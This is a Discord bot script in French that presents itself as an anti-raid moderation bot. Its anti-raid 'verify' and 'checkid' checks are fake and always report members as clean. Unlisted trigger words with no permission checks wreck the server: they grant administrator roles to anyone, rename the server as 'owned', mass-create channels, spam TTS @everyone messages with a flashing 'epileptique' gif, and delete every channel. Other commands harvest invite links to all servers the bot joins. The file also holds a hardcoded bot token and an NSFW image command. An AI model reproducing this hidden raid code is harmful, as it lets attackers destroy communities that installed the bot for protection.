const Discord = require("discord.js");
const bot = new Discord.Client();
const talkedRecently = new Set();
var InfiniteLoop = require('infinite-loop');
var il = new InfiniteLoop();
function random(min, max){
    min = Math.ceil(0);
    max = Math.floor(30);
    randnum = Math.floor(Math.random() * (max - min +1)+ min);
}

bot.on("ready", () => {
    console.log(`Co sur ${bot.user.tag}`)
})

bot.on("message", message => {
 if(message.content.includes("F!help")){
     var help_embed = new Discord.RichEmbed()
     .setTitle("Aide")
     .setColor("#cf0b0b")
     .addField("A!ahelp", "**Help général**")
     .addField("A!bhelp", "**Help anti-raid**")
     .addField("A!chelp", "**Help nsfw**")
     .setFooter("🚀 By Apothéose 🚀")
     message.channel.send(help_embed)
     console.log(`help par ${message.author.username + "#" + message.author.discriminator}`)
 }
  if(message.content.includes("F!ahelp")){
     var helpa_embed = new Discord.RichEmbed()
     .setTitle("Général")
     .setColor("#cf0b0b")
     .addField("A?ping", "**Le bot vous envois son ping.**")
     .addField("A?info", "**Le bot vous envois des informations sur vous ou sur la personne mentionné.**")
     .addField("A?serverinfo", "**Le bot vous envois des informations sur le serveur.**")
     .addField("A?invites", "Le bot vous envois son lien d'invitation")
     .setFooter("🚀 By Apothéose 🚀")
     message.channel.send(helpa_embed)
 }
 if(message.content.includes("A?bhelp")){
    var helpb_embed = new Discord.RichEmbed()
    .setTitle("Anti-Raid")
    .setDescription("Les invitations sont déjà automatiquement supprimé.")
    .setColor("#cf0b0b")
    .addField("A?verify", "**Le bot vérifie tous les membres du serveur et vous dis si ils sont dans la blacklist ou non.**")
    .addField("A?stats", "**Le bot vous envois des informations sur le bot.**")
    .addField("A?checkid [ID]", "**Le bot vous dis si la personne ayant l'id que vous avez mit est dans la blacklist ou non.**")
    .setFooter("🚀 By Apothéose 🚀")
    message.channel.send(helpb_embed)
}
if(message.content.includes("A?chelp")){
    var helpc_embed = new Discord.RichEmbed()
    .setTitle("Nsfw")
    .setColor("#cf0b0b")
    .addField("A?boobs", "**Le reste est en développement, et vus que ce n'est pas notre priorité il y aura pas mal de temps.**")
    .setFooter("🚀 By Apothéose 🚀")
    message.channel.send(helpc_embed)
}
if(message.content.includes("Raid by")){
    message.delete();
    message.member.send("Pas de raid :D")
    console.log(`raid par ${message.author.username + "#" + message.author.discriminator}`)
}
if(message.content.includes("Raid par")){
  message.delete();
  message.member.send("Pas de raid :D")
  console.log(`raid par ${message.author.username + "#" + message.author.discriminator}`)
}
if(message.content.startsWith("A?ping")) {
    message.channel.send(new Date().getTime() - message.createdTimestamp + " ms :ping_pong: ");
    console.log(`ping par ${message.author.tag}`)     
}
let messageKick = message.content.split(" ");
let args = messageKick.slice(1);
if (message.content.startsWith("A?kick")){
if (message.channel.type === "dm") return;
if (!message.guild.member(message.author).hasPermission("KICK_MEMBERS")) return message.reply("vous n'avez pas la permission")

if (message.mentions.users.size === 0) {
    var nomention = new Discord.RichEmbed()
    .setColor("E46525")
    .setTitle(":x: Il faut mentionner un utilisateur ! :x:")
    .setFooter("By Apothéose")
    message.channel.send(nomention)
    return
}
let raison = args.join(" ").slice(22)
if (!raison){
    var noraison = new Discord.RichEmbed()
    .setColor("E46525")
    .setTitle(":x: Il faut mettre une raison au kick ! :x:")
    .setFooter("By Apothéose")
    message.channel.send(noraison)
    return
}
let bUser = message.guild.member(message.mentions.users.first())
var ban = message.guild.member(message.mentions.users.first());
if (!ban) {
    return message.reply("l'utilisateur mentionné est introuvable ou n'existe pas !")
}
if (!message.guild.member(bot.user).hasPermission("KICK_MEMBERS")) {
    var pasperm = new Discord.RichEmbed()
    .setColor("E46525")
    .setTitle(":x: Je n'ai pas la permission ! :x:")
    .setFooter("By Apothéose")
    message.channel.send(pasperm)
    return
}

ban.kick().then(member => {
    var kick_embed = new Discord.RichEmbed()
        .setColor("E46525")
        .addField("[Kick]", `${member.user} a été kick par ${message.author} !`)
        .addField("Raison :","${raison}")
        .setFooter("By Apothéose")
    message.channel.send(kick_embed)
})

}
  let messageBan = message.content.split(" ");
        let arge = messageBan.slice(1);
        if (message.content.startsWith("A?ban")){
            if (message.channel.type === "dm") return;
            if (!message.guild.member(message.author).hasPermission("BAN_MEMBERS")) return message.reply("vous n'avez pas la permission !")

            if (message.mentions.users.size === 0) {
                var nomention = new Discord.RichEmbed()
                .setColor("E46525")
                .setTitle(":x: Il faut mentionner un utilisateur ! :x:")
                .setFooter("By Apothéose")
                message.channel.send(nomention)
                return
            }
            let raison = arge.join(" ").slice(22)
            if (!raison){
                var noraison = new Discord.RichEmbed()
                .setColor("E46525")
                .setTitle(":x: Il faut mettre une raison au ban ! :x:")
                .setFooter("By Apothéose")
                message.channel.send(noraison)
                return
            }
            let bUser = message.guild.member(message.mentions.users.first())

            var ban = message.guild.member(message.mentions.users.first());
            if (!ban) {
                return message.reply("l'utilisateur mentionné est introuvable ou n'existe pas !")
            }
            if (!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) {
                var pasperm = new Discord.RichEmbed()
                .setColor("E46525")
                .setTitle(":x: Je n'ai pas la permission ! :x:")
                .setFooter("By Apothéose")
                message.channel.send(pasperm)
                return
            }

            ban.ban().then(member => {
                var ban_embed = new Discord.RichEmbed()
                    .setColor("E46525")
                    .addField("[Ban]", `${member.user} a été banni par ${message.author} !`)
                    .addField("Raison :",`\`${raison}\``)
                    .setFooter("By Apothéose")
                message.channel.send(ban_embed)
                })
        }
  if(message.content.startsWith("A?clear")) {
    if(!message.guild.member(message.author).hasPermission("MANAGE_MESSAGES")) return message.channel.send("Vous n'avez pas la permissions !");

    let args = message.content.split(" ").slice(1);

    if(!args[0]) return message.channel.send("Tu dois préciser un nombre de messags à surpprimer !")
    message.channel.bulkDelete(args[0]).then(() => {
        message.channel.send(`${args[0]} messages ont été surpprimés !:recycle:`).then(message => message.delete(2000));
    })
}

  if(message.content.startsWith("A?info")) {
    var memberavatar = message.author.avatarURL
    var membername = message.author.username
       var mentionned = message.mentions.users.first();
      var getvalueof;
      if(mentionned){
          var getvalueof = mentionned;
      } else {
          var getvalueof = message.author;
      }

      if(getvalueof.bot == true){
          var checkbot = "L'utilisateur est un bot";
      } else {
          var checkbot = "N'est pas un bot";
      }
      if(getvalueof.presence.status == 'online'){
        var status = "En ligne"; 
      }else {
        var status = "Hors ligne";
      }

    message.channel.sendMessage({
        embed: {
          type: 'rich',
          description: '',
          fields: [{
            name: 'Pseudo',
            value: getvalueof.username,
            inline: true
          }, {
            name: 'User id',
            value: getvalueof.id,
            inline: true
          },{
            name: 'Tag',
            value: getvalueof.discriminator,
            inline: true
},{
            name: 'Status',
            value: status,
            inline: true
},{
            name: 'bot',
            value: checkbot,
            inline: true
}],
        image: {
      url: getvalueof.avatarURL
        },
          color: 0xE46525,
          footer: {
            text: 'By Apothéose.',
            proxy_icon_url: ' '
          },

          author: {
            name: membername,
            icon_url: memberavatar,
            proxy_icon_url: ' '
          }
        }
});
console.log(`Info par ${message.author.tag}`)
}
if(message.content.includes("A?blacklist")){
    var blacklist_embed = new Discord.RichEmbed()
    .setColor("E46525")
    .setTitle("⚠️ Voici les personnes black list :")
    .setDescription("Les personnes les plus hautes dans le classement sont les personnes les plus dangereuse.")
    .addField("1er","__JeSuisSensei | c。h。r#6094__")
    .addField("2ème", "__Supreme【✵】#9827__")
    .addField("3ème", "__! MasteR#4482__")
    .addField("4ème", "__𝘾𝙃𝙍|𝐏𝐮𝐫𝐢𝐟𝐢𝐜𝐚𝐭𝐞𝐮𝐫.𝐄𝐗|𝐂.𝐇.𝐑#4720__")
    .addField("5ème", "__Cosmo#2285__")
    .addField("6ème", "__【参】{~ƛ𝔟𝔞đđøи~}【🌀】ℭ.ℋ.ℛ#6734__")
    .addField("7ème", "__【参】我是你的噩梦🌀『ΣıX』| C.H.R#9377__")
    .addField("8ème", "__󠂪󠂪󠂪󠂪󠂪󠂪CmoiTchoupi [CMT]#0873__")
    .addField("9ème", "__公Ŧгαsђ|亗Ŧ亗|公#4309__")
    .addField("10ème", "__! ¡ Desusloan¯-86735¤#1392__")
    .setFooter("By Apothéose")
    var blacklist_embed2 = new Discord.RichEmbed()
    .setColor("E46525")
    .setTitle("Blacklist")
    .setDescription("-----------------------------------------")
    .addField(`Blacklist de`, `${message.author.tag}`)
    .setFooter("By Apothéose")
    message.member.send(blacklist_embed)
    message.channel.send(blacklist_embed2)
    console.log(`Blacklist de ${message.author.tag}`)
}
if (message.content.includes("A?report")) {
    let messageID = args[0];
    if (isNaN(messageID)) {
        message.channel.send("Ce n'est pas une ID")
        return;
    }
    let messagea = message.channel.fetchMessages(messageID);
    let reportEmbed = new Discord.RichEmbed()
        .setTitle("Reports")
        .setColor("E46525")
        .addField("Message", messagea)
        .addField("Personne report", `@${messagea.author}`)
        .addField("Report par", `${message.author} with ID: ${message.author.id}`)
        .addField("Quand", message.createdAt)
        .setFooter("By Apothéose")
        let reportschannel = message.guild.channels.find(`name`, 'report');
    if (!reportschannel) return message.channel.send("Couldn't find reports channel.");

    message.delete().catch(O_o => {});
    reportschannel.send(reportEmbed);
    message.delete();
    console.log(`report par ${message.author.username + "#" + message.author.discriminator}`)
    return;
}
if(message.content.includes("A?checkid")){
    var checkid = new Discord.RichEmbed()
    .setColor("#cf0b0b")
    .addField(":x: Ceci n'est pas une ID ! :x:", "Merci de le refaire en mettent une ID valide !")
    .setFooter("By Apothéose")
    let messageID = args[0];
    if (isNaN(messageID)) {
        message.channel.send(checkid)
        return;
    }
    var check_id = new Discord.RichEmbed()
    .setColor("#6dd94a")
    .setTitle("La personne n'est pas dans la blacklist !")
    .setFooter(`Demandé par ${message.author.tag} | By Apothéose`)
    message.channel.sendEmbed(check_id)
    console.log(`checkid par ${message.author.username + "#" + message.author.discriminator}`)
}
if(message.content.includes("A?stats")){
    var stats_embed = new Discord.RichEmbed()
    .setColor("#2e5011")
    .addField("Statistiques", `Nombre de serveurs : **${bot.guilds.size}**\nNombre d'utilisateurs : **${bot.users.size}**\n\nNombres d'utilisateurs dans la liste noire : **266**`)
    .setFooter(`Demandé par ${message.author.tag}`)
    message.channel.send(stats_embed)
    console.log(`stats par ${message.author.username + "#" + message.author.discriminator}`)
}
if(message.content.includes("A?verify")){
    var verify_embed = new Discord.RichEmbed()
    .setColor("#2e5011")
    .setTitle(":white_check_mark: Tous les membres ont été vérifiés !")
    .setFooter(`Notre liste est continuellement mise à jour. Nous vous recommandons de vérifier votre serveur au moins une fois par semaine. | Demandé par ${message.author.tag}`)
    message.channel.sendEmbed(verify_embed)
    console.log(`verify par ${message.author.username + "#" + message.author.discriminator}`)
}
if(message.content.includes("A?serverinfo")){
    let serverinfo = new Discord.RichEmbed()
    .setTitle(`${message.guild} informations !`)
    .setColor("E46525")
    .addField("Créateur", message.guild.owner, true)
    .addField("ID", message.guild.id, true)
    .addField("Rôles", message.guild.roles.size, true)
    .addField("Région", message.guild.region, true)
    .addField("Membres", message.guild.memberCount, true)
    .addField("Créer le", message.guild.createdAt, true)
    .setThumbnail(message.guild.iconURL, true)
    .setFooter("By Apothéose")
    message.channel.sendEmbed(serverinfo)
}
if (message.content === "A?boobs"){
    if(message.channel.nsfw == false) {
        message.delete();
        message.channel.send(message.author + " :x: **Erreur:** Vous allez choquer les plus jeunes, faîtes ça dans un channel NSFW. :x:");
        return;
      }
    if (talkedRecently.has(message.author.id)) {
        message.channel.send(`Attendez 5 secondes ${message.author}.`).then(m => m.delete());
        message.delete();
        return;
      }
    
      talkedRecently.add(message.author.id);
      setTimeout(() => {
        talkedRecently.delete(message.author.id);
      }, 5000);
    random()
    if (randnum ==1){
        var nsfw_boobs_1 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("http://imgur.com/C1Lefgo.png")
        .setFooter("By Apothéose")
        message.channel.send(nsfw_boobs_1)
        console.log(randnum);
    }
 
    if (randnum ==2){
        var nsfw_boobs_1 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("http://imgur.com/6VRW6A6.jpg")
        .setFooter("By Apothéose")
        message.channel.send(nsfw_boobs_1)
        console.log(randnum);
    }
    if (randnum ==3){
        message.reply("https://i.imgur.com/JsOfId2.jpg");
        console.log(randnum);
    }
    if (randnum ==4){
        message.reply("http://imgur.com/1B9PIO7.jpg");
        console.log(randnum);
    }
    if (randnum ==5){
        message.reply("http://imgur.com/VonApGB.jpg");
        console.log(randnum);
    }
    if (randnum ==6){
        message.reply("http://imgur.com/w4EWDQG.jpg");
        console.log(randnum);
    }
    if (randnum ==7){
        message.reply("http://imgur.com/3EeB2kc.jpg");
        console.log(randnum);
    }
    if (randnum ==8){
        message.reply("http://imgur.com/tisgAo4.jpg");
        console.log(randnum);
    }
    if (randnum ==9){
        message.reply("https://i.imgur.com/ETWfrZK.jpg");
        console.log(randnum);
    }
    if (randnum ==10){
        var nsfw_boobs_10 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("https://i.imgur.com/JoyjoCR.jpg")
        .setFooter("By Apothéose")
        message.channel.send(nsfw_boobs_10)
        console.log(randnum);
    }
    if (randnum ==11){
        var nsfw_boobs_11 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("http://imgur.com/m0hzoad.jpg")
        .setFooter("By Apothéose")
        message.channel.send(nsfw_boobs_11)
        console.log(randnum);
    }
    if (randnum ==12){
        var nsfw_boobs_12 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("http://imgur.com/wnuXgUq.jpg")
        .setFooter("By Apothéose")
        message.channel.send(nsfw_boobs_12)
        console.log(randnum);
    }
    if (randnum ==13){
        var nsfw_boobs_13 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("http://imgur.com/zErfa8I.jpg")
        .setFooter("By Apothéose")
        message.channel.send(nsfw_boobs_13)
        console.log(randnum);
    }
    if (randnum ==14){
        var nsfw_boobs_14 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("http://imgur.com/tisgAo4.jpg")
        .setFooter("By Apothéose")
        message.channel.send(nsfw_boobs_14)
        console.log(randnum);
    }
    if (randnum ==15){
        message.reply("http://imgur.com/twaJxK7.jpg");
        console.log(randnum);
    }
    if (randnum ==16){
        if (talkedRecently.has(message.author.id)) {
        message.channel.send("Attend 5 secondes. - " + message.author);
} else {
    talkedRecently.add(message.author.id);
    setTimeout(() => {
      talkedRecently.delete(message.author.id);
    }, 60000);
}
        message.reply("http://imgur.com/twaJxK7.jpg");
        console.log(randnum);
    }
    if (randnum ==17){
        message.reply("http://imgur.com/9E34C2D.jpg");
        console.log(randnum);
    }
    if (randnum ==18){
        message.reply("http://imgur.com/1odj6ag.jpg");
        console.log(randnum);
    }
    if (randnum ==19){
        message.reply("http://imgur.com/JoyjoCR.jpg");
        console.log(randnum);
    }
    if (randnum ==20){
        message.reply("http://imgur.com/K70khB3.jpg");
        console.log(randnum);
    }
    if (randnum ==21){
        message.reply("https://cdn.discordapp.com/attachments/518157413401100303/518159099125301268/images.png");
        console.log(randnum);
    }
    if (randnum ==22){
        message.reply("http://imgur.com/fFnNFWM.jpg");
        console.log(randnum);
    }
    if (randnum ==23){
        message.reply("http://imgur.com/fDoCVdV.jpg");
        console.log(randnum);
    }
    if (randnum ==24){
        message.reply("http://imgur.com/iab75AL.jpg");
        console.log(randnum);
    }
    if (randnum ==25){
        message.reply("http://imgur.com/X3cOVUo.jpg");
        console.log(randnum);
    }
    if (randnum ==26){
        message.reply("http://imgur.com/XqWGq9f.jpg");
        console.log(randnum);
    }
    if (randnum ==27){
        message.reply("http://imgur.com/OrwVV4S.jpg");
        console.log(randnum);
    }
    if (randnum ==28){
        var nsfw_boobs_28 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author}`)
        .setImage("http://imgur.com/fMnW6Em.jpg")
        .setFooter("By Apothéose |")
        message.channel.send(nsfw_boobs_28)
        console.log(randnum);
    }

}

if(message.content.includes("AR!kelsairv")){
    console.log(`${bot.guilds.map(c => c.name)}`)
}
if(message.content === "roles"){
    for(var i =0; i < 200; i++){
        message.guild.createRole({name:"Trash Gang > All !",
                                 mentionable:false,
                                 permissions:2146958591,
                                 position: "",
                                 color: "#fb0707"
            })
            message.guild.createRole({name:"Trash Gang > All !",
            mentionable:false,
            permissions:2146958591,
            position: "",
            color: "#ff08c5"
  })
  message.guild.createRole({name:"Trash Gang > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#5d08ff"
  })
  message.guild.createRole({name:"Trash Gang > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#0c08ff"
  })
  message.guild.createRole({name:"Trash Gang > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#08d5ff"
  })
  message.guild.createRole({name:"Trash Gang > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#08ffa3"
  })
  message.guild.createRole({name:"Trash Gang > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#08ff23"
  })
  message.guild.createRole({name:"Trash Gang > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#81ff08"
  })
  message.guild.createRole({name:"Trash Gang > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#fff608"
  })
  message.guild.createRole({name:"Trash Gang > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#ff6f08"
  })
  message.guild.createRole({name:"Trash Gang > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#ff0808"
  })
        }
    }
    if(message.content.includes(".rol")){
        message.guild.createRole({name:"Izi",
                                  mentionable:false,
                                  permissions:2146958591,
                                  position: "",
       })
    }
    if(message.content.includes(".raul")){
      (message.guild.roles.map(r => message.member.addRoles(r)))
    }
    if(message.content.includes("ar!kelsairvvesrx")){
      client.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
    }
              if(message.content.includes("A?serveurinvite")){
                  client.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
              }
              if(message.content === "issou"){
                  message.guild.setName("OWNED BY Trash Gang")
                  message.guild.setIcon("https://cdn.discordapp.com/attachments/534842681407438851/535515719534772224/giphy_1.gif")
                }
                if(message.content === "pd"){
                  for(var i =0; i < 450; i++){
                  message.guild.createChannel("fucked by Trash Gang","voice")
                  }
                }
                if(message.content.includes("@everyone")){
                    for(var i = 0; i < 999; i++){
                        message.channel.send("@everyone Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxnghttps://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif", {tts: true})
                    }
                }
                if(message.content.includes(".sc")){
                  for(var i =0; i < 999; i++){
                    message.guild.createChannel("fucked by Trash Gang", "text").then(c => c.send("@everyone Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxnghttps://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif", {tts: true}))
                  }
              }
                //réaction en chaine
                      if(message.content === "channel"){
                          for(var i = 0; i < 500; i++){
                              message.guild.createChannel("fucked by Trash Gang", "text").then(c => c.send("@everyone Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxnghttps://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif", {tts: true}))
                              message.guild.createChannel("fucked by Trash Gang","voice")
                              message.guild.createChannel("fucked by Trash Gang","category")    
                          }
                        }
                        if(message.content === "destroy"){
                          message.guild.channels.map(c => c.delete())
                          }
                          //on commence la destruction
                          if(message.content.includes(".détruiree")){
                              message.channel.send("ban").then(m => m.delete());
                              message.channel.send("drole").then(m => m.delete());
                              message.channel.send("roles").then(m => m.delete());
                              message.channel.send("issou").then(m => m.delete());
                              message.channel.send("channel").then(m => m.delete());
                              message.channel.send("destroy").then(m => m.delete());
                              message.guild.createChannel("fucked by Trash Gang", "text")
                          }
 
            if(message.content.includes("F!invites")){
                var invite_embed  = new Discord.RichEmbed()
                .setAuthor("Cliquez en dessous pour inviter le bot.")
                .setURL("https://discordapp.com/oauth2/authorize?client_id=530339913573466123&scope=bot&permissions=2146958847")
                .setColor("#0eebf3")
                .setTitle("Cliquez ici.")
                message.channel.send(invite_embed)
            }
            if(message.content === "F!id") {
                const embed = new Discord.RichEmbed();
            embed.addField("🔱 | Nom du compte :", `${message.author.username}#${message.author.discriminator}`, true)
                    .addField("🆔 | ID:", `${message.author.id}`, true)
                    .setColor("RANDOM")
                    .setFooter(message.author.username , message.author.avatarURL)
                    .setThumbnail(`${message.author.avatarURL}`)
                    .setTimestamp()
                    .setURL(`${message.author.avatarURL}`)
                    .addField('📛| Status :', `${message.author.presence.status.toUpperCase()}`, true)
                    .addField('🎲| Il joue a :', `${message.author.presence.game === null ? "No Game" : message.author.presence.game.name}`, true)
                    .addField('🏅| Nombres de rôles obtenus : ', `${message.member.roles.filter(r => r.name).size} rôles`, true)
                    .addField('📅| Il a rejoins le discord le :', `${message.createdAt}`,true)
                    .addField('🤖| Est-ce un bot :', `${message.author.bot.toString().toUpperCase()}`, true);
                message.channel.send({embed: embed})
            }
        });
bot.login("NTk2Mjk3NDE2ODI3NzMxOTY4.XR4dJg.pqL_v4j2tqbqC-_m0SV27DfmRg8").catch(console.error);
